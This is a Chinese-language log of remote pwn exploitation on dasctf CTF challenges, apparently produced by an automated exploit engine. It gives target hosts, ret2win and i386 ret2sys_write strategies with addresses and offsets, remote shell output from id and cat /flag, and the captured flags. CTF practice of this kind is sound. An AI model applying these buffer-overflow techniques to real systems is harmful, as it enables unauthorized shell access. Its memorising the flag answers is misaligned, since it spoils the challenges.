# 远程实打记录（dasctf 平台）

> 判定：拿到远端进程的 shell，并在其中执行 `id` / `cat /flag` 有真实回显。
> 每条都附「反向对照」结论，避免把「连上了」当成「打通了」。

## 1. `090d11f4…`（ret2win, amd64, Partial RELRO）

- 目标：`498ad229bce7d5be4c6bb2d0.tcp-ctf2.dasctf.com:9999`（TLS + SNI）
- 策略：`ret2win` → `system("/bin/sh") @ 0x401186`，off=23
- 耗时：2 次尝试（第 1 次是未对齐变体，被服务端 `timeout` 收掉）
- 远端回显：

```
PWNED_42
ctf
uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
```

- `cat /flag` → `CTF2{fc1e9971-7d2f-4210-ae51-87c48c4aab20}`
- 反向对照：拿错误附件 `58a4f498…` 打同一端口 → 10 次尝试全 FAILED（无假成功）

## 2. `f5b5ad3d…`（i386 静态, NX, Partial RELRO）

- 目标：`dc35bb7af89126d01c70fe49.tcp-ctf2.dasctf.com:9999`（TLS）
- 策略：`ret2sys_write` — `gets(bss)` 写入 `/bin/sh` → 回 main → `int 0x80` execve，off=56
- 本地：`SHELL ret2sys_write uid=0(root)`
- 远端：`SHELL ret2sys_write uid=1000(ctf)`
- 远端回显：

```
$ id
  uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
$ ls -la /
  lrwxrwxrwx 1 root root 5 Oct 14 2019 flag.txt -> /flag
  ... drwxr-xr-x 1 root root 4096 Dec  8  2019 pwn
$ cat /flag
  CTF2{6b390e76-76ec-4f60-aaa0-77bbfa2c3dc0}
```

- 备注：首次打成功后该实例被平台回收，再次连接返回
  `This address has no running target. Return to the challenge page, start or renew it, then reconnect.`
  —— 属于平台侧实例生命周期，不是利用失败（引擎已能识别并提示）。

## 3. 已验证 / 未验证的边界

| 链路 | 远程验证 |
|---|---|
| ret2win（amd64） | ✓ 真实远程 |
| ret2sys_write（i386 静态，无 `/bin/sh`） | ✓ 真实远程 |
| ret2libc | 未验证（需远程同版本 libc 才能算 system） |
| ret2csu / shellcode / canary+fmt / fmtstr GOT | 未验证 |

不把「本地 14/16」等价成「远程 14/16」。
